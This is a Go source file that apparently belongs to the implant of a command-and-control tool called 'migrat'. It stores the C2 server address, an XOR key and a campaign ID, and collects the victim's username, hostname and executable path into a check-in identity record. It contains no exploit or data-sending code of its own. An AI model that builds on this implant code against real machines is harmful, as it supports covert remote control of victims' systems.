package state

import (
	"migrat/contact"
	"migrat/module"
	"os"
	"os/user"
	"sync"

	"github.com/google/uuid"
)

type Info struct {
	id           string
	Xorkey       []byte
	username     string
	computername string
	processname  string
	campain      string
}

type State struct {
	C2address      string
	Info           Info
	RunningModules map[string]*module.Module
	ModulesLock    sync.RWMutex
}

func Init_state(campain string, address string, xorkey string) State {
	return State{

		C2address:      address,
		Info:           init_info(campain, xorkey),
		RunningModules: make(map[string]*module.Module),
		ModulesLock:    sync.RWMutex{},
	}
}

func init_info(campain string, xorkey string) Info {
	var username string
	user, err := user.Current()
	if err != nil {
		username = "unknown"
	} else {
		username = user.Username
	}

	computername, err := os.Hostname()
	if err != nil {
		computername = "unknown"
	}

	processname, err := os.Executable()
	if err != nil {
		processname = "unknown"
	}

	return Info{
		id:           uuid.New().String(),
		Xorkey:       []byte(xorkey),
		username:     username,
		computername: computername,
		processname:  processname,
		campain:      campain,
	}
}

func (info Info) To_ident() *contact.Ident {
	return &contact.Ident{
		Id:           info.id,
		CampainId:    info.campain,
		ComputerName: info.computername,
		Processname:  info.processname,
		Username:     info.username,
	}
}
